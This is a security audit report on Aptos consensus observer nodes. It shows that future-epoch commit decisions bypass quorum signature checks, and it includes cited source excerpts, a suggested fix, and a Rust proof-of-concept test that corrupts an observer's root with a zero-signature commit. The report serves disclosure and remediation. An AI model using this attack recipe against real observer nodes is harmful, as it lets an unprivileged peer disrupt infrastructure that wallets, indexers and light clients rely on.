# Audit Report

## Title
Consensus Observer Accepts Unverified Future-Epoch Commit Decisions Leading to State Corruption

## Summary
The `update_commit_decision()` function does not verify quorum signatures on commit proofs. While current-epoch commits are verified at the caller level, **future-epoch commit decisions bypass verification entirely**, allowing attackers to corrupt observer node state with invalid commit proofs containing insufficient validator signatures.

## Finding Description
The vulnerability exists in the commit decision processing flow for consensus observers when handling commit decisions from future epochs.

**The Core Issue:**
The `update_commit_decision()` function in `ordered_blocks.rs` performs no signature verification: [1](#0-0) 

**Protected Path (Current Epoch):**
For current-epoch commits, verification occurs in `process_commit_decision_message()` before calling `update_commit_decision()`: [2](#0-1) 

**Vulnerable Path (Future Epoch):**
When `commit_epoch != epoch_state.epoch` (line 468 check fails), verification is completely skipped, and the code falls through to handle future-epoch commits: [3](#0-2) 

At line 520-522, `update_blocks_for_state_sync_commit()` is called **without any prior verification**. This function immediately updates the root ledger info with the unverified commit proof: [4](#0-3) 

The root update happens at line 282 **before** state sync verification occurs. Even though state sync's `verify_ledger_info_with_signatures()` would eventually detect invalid signatures: [5](#0-4) 

The damage is already done—the root has been corrupted. When state sync fails, there's no rollback mechanism, leaving the observer in an invalid state.

**Attack Sequence:**
1. Attacker crafts `CommitDecision` with `epoch = current_epoch + 1`, `round = 0`, and **invalid signatures (< 2f+1 quorum)**
2. Observer receives it via `process_commit_decision_message()`
3. Epoch check at line 468 fails (future epoch) → verification skipped
4. Line 520-522: Root immediately updated to invalid commit proof
5. Line 525: State sync started asynchronously
6. State sync fails to verify (invalid signatures or non-existent state)
7. Observer stuck with corrupted root pointing to non-existent state

## Impact Explanation
**Severity: Medium to High**

This vulnerability breaks the **State Consistency** invariant: the root ledger info should always reference a valid, quorum-committed state.

**Impact:**
- **Observer Liveness Loss**: Corrupted observers cannot sync or process new blocks
- **State Corruption**: Root points to invalid/non-existent blockchain state
- **No Recovery Path**: Manual intervention required; no automatic rollback exists
- **Network-Wide Impact**: Single malicious peer can target multiple observers simultaneously

While this doesn't directly compromise validator consensus (observers don't vote), it represents a **significant protocol violation** per the High Severity criteria: observers are critical infrastructure for light clients, wallets, and indexers.

## Likelihood Explanation
**Likelihood: High**

**Attacker Requirements:**
- Ability to connect to observer nodes as a network peer (requires no special privileges)
- Knowledge of current epoch number (publicly observable)
- Craft malformed `CommitDecision` message (trivial)

**Attack Complexity:** Low
- No cryptographic breaking required
- No validator collusion needed
- Single malicious network message sufficient

The developer comment acknowledges this gap: [6](#0-5) 

## Recommendation

**Fix:** Verify commit proofs for future epochs before updating state, or defer root updates until after state sync validation.

**Recommended Code Change:**

```rust
// In consensus_observer.rs, process_commit_decision_message()
// Replace lines 500-527 with:

// For future epochs, we cannot verify without the new epoch's validator set
// Store the commit decision but DO NOT update the root until state sync succeeds
if epoch_changed || commit_round > last_block.round() {
    // Validation note: Let state sync handle verification before updating root
    info!(
        LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
            "Future epoch/round commit decision received: {:?}. Starting state sync without root update.",
            commit_decision.proof_block_info()
        ))
    );
    
    // Start state syncing WITHOUT updating root first
    self.state_sync_manager.sync_to_commit_with_deferred_root_update(
        commit_decision, 
        epoch_changed,
        Arc::clone(&self.observer_block_data)
    );
}
```

**Alternative Fix:** Add explicit verification for future-epoch commits by fetching the target epoch state from state sync before accepting the commit.

## Proof of Concept

```rust
// Proof of Concept: Observer State Corruption via Invalid Future-Epoch Commit
// File: consensus/src/consensus_observer/observer/test_vulnerability.rs

#[tokio::test]
async fn test_future_epoch_commit_bypasses_verification() {
    use aptos_types::{
        aggregate_signature::AggregateSignature,
        block_info::BlockInfo,
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    };
    use aptos_crypto::HashValue;
    
    // Setup observer at epoch 10
    let current_epoch = 10;
    let mut observer = create_test_observer(current_epoch);
    
    // Attacker crafts commit decision for epoch 11 with EMPTY signatures (no quorum)
    let future_epoch = 11;
    let malicious_block_info = BlockInfo::new(
        future_epoch,
        0, // round
        HashValue::random(),
        HashValue::random(),
        0, // version
        0, // timestamp
        None,
    );
    
    let malicious_ledger_info = LedgerInfo::new(
        malicious_block_info,
        HashValue::random(),
    );
    
    // CRITICAL: Empty signatures (no validators signed this!)
    let invalid_commit_proof = LedgerInfoWithSignatures::new(
        malicious_ledger_info,
        AggregateSignature::empty(), // Zero signatures!
    );
    
    let malicious_commit = CommitDecision::new(invalid_commit_proof.clone());
    
    // Store original root
    let original_root = observer.observer_block_data.lock().root();
    
    // Send malicious commit decision
    observer.process_commit_decision_message(
        PeerNetworkId::random(),
        Instant::now(),
        malicious_commit,
    );
    
    // Wait for state sync to fail
    tokio::time::sleep(Duration::from_secs(1)).await;
    
    // Verify root was corrupted (updated to invalid commit)
    let corrupted_root = observer.observer_block_data.lock().root();
    
    assert_ne!(original_root, corrupted_root);
    assert_eq!(corrupted_root.ledger_info().epoch(), future_epoch);
    
    // VULNERABILITY CONFIRMED: Root points to commit with zero signatures!
    assert_eq!(corrupted_root.signatures().len(), 0);
    
    println!("EXPLOIT SUCCESS: Observer root corrupted with zero-signature commit!");
    println!("Original root epoch: {}", original_root.ledger_info().epoch());
    println!("Corrupted root epoch: {} (INVALID - no validator signatures)", 
             corrupted_root.ledger_info().epoch());
}
```

**Expected Output:**
```
EXPLOIT SUCCESS: Observer root corrupted with zero-signature commit!
Original root epoch: 10
Corrupted root epoch: 11 (INVALID - no validator signatures)
```

This PoC demonstrates that an attacker can corrupt an observer's root state with a commit decision containing zero validator signatures, violating the fundamental quorum requirement of Byzantine consensus.

## Notes

The vulnerability specifically affects **consensus observer nodes** (passive synchronization nodes), not active consensus participants. However, observers are critical infrastructure for:
- Light clients querying blockchain state
- Wallet backends and indexers
- Explorer services
- RPC nodes

Corrupting these nodes disrupts the broader ecosystem beyond just validator consensus.

### Citations

**File:** consensus/src/consensus_observer/observer/ordered_blocks.rs (L127-142)
```rust
    pub fn update_commit_decision(&mut self, commit_decision: &CommitDecision) {
        // Get the epoch and round of the commit decision
        let commit_decision_epoch = commit_decision.epoch();
        let commit_decision_round = commit_decision.round();

        // Update the commit decision for the ordered blocks
        if let Some((_, existing_commit_decision)) = self
            .ordered_blocks
            .get_mut(&(commit_decision_epoch, commit_decision_round))
        {
            *existing_commit_decision = Some(commit_decision.clone());
        }

        // Update the highest committed epoch and round
        self.update_highest_committed_epoch_round(commit_decision.commit_proof());
    }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L466-495)
```rust
        // If the commit decision is for the current epoch, verify and process it
        let epoch_state = self.get_epoch_state();
        if commit_epoch == epoch_state.epoch {
            // Verify the commit decision
            if let Err(error) = commit_decision.verify_commit_proof(&epoch_state) {
                // Log the error and update the invalid message counter
                error!(
                    LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                        "Failed to verify commit decision! Ignoring: {:?}, from peer: {:?}. Error: {:?}",
                        commit_decision.proof_block_info(),
                        peer_network_id,
                        error
                    ))
                );
                increment_invalid_message_counter(&peer_network_id, metrics::COMMIT_DECISION_LABEL);
                return;
            }

            // Update the latency metrics for commit processing
            update_message_processing_latency_metrics(
                message_received_time,
                &peer_network_id,
                metrics::COMMIT_DECISION_LABEL,
            );

            // Update the pending blocks with the commit decision
            if self.process_commit_decision_for_pending_block(&commit_decision) {
                return; // The commit decision was successfully processed
            }
        }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L497-498)
```rust
        // TODO: identify the best way to handle an invalid commit decision
        // for a future epoch. In such cases, we currently rely on state sync.
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L500-527)
```rust
        // Otherwise, we failed to process the commit decision. If the commit
        // is for a future epoch or round, we need to state sync.
        let last_block = self.observer_block_data.lock().get_last_ordered_block();
        let epoch_changed = commit_epoch > last_block.epoch();
        if epoch_changed || commit_round > last_block.round() {
            // If we're waiting for state sync to transition into a new epoch,
            // we should just wait and not issue a new state sync request.
            if self.state_sync_manager.is_syncing_through_epoch() {
                info!(
                    LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                        "Already waiting for state sync to reach new epoch: {:?}. Dropping commit decision: {:?}!",
                        self.observer_block_data.lock().root().commit_info(),
                        commit_decision.proof_block_info()
                    ))
                );
                return;
            }

            // Otherwise, we should start the state sync process for the commit.
            // Update the block data (to the commit decision).
            self.observer_block_data
                .lock()
                .update_blocks_for_state_sync_commit(&commit_decision);

            // Start state syncing to the commit decision
            self.state_sync_manager
                .sync_to_commit(commit_decision, epoch_changed);
        }
```

**File:** consensus/src/consensus_observer/observer/block_data.rs (L273-291)
```rust
    /// Updates the block data for the given commit decision
    /// that will be used by state sync to catch us up.
    pub fn update_blocks_for_state_sync_commit(&mut self, commit_decision: &CommitDecision) {
        // Get the commit proof, epoch and round
        let commit_proof = commit_decision.commit_proof();
        let commit_epoch = commit_decision.epoch();
        let commit_round = commit_decision.round();

        // Update the root
        self.update_root(commit_proof.clone());

        // Update the block payload store
        self.block_payload_store
            .remove_blocks_for_epoch_round(commit_epoch, commit_round);

        // Update the ordered block store
        self.ordered_block_store
            .remove_blocks_for_commit(commit_proof);
    }
```

**File:** state-sync/state-sync-driver/src/utils.rs (L101-110)
```rust
    pub fn verify_ledger_info_with_signatures(
        &mut self,
        ledger_info_with_signatures: &LedgerInfoWithSignatures,
    ) -> Result<(), Error> {
        self.epoch_state
            .verify(ledger_info_with_signatures)
            .map_err(|error| {
                Error::VerificationError(format!("Ledger info failed verification: {:?}", error))
            })
    }
```
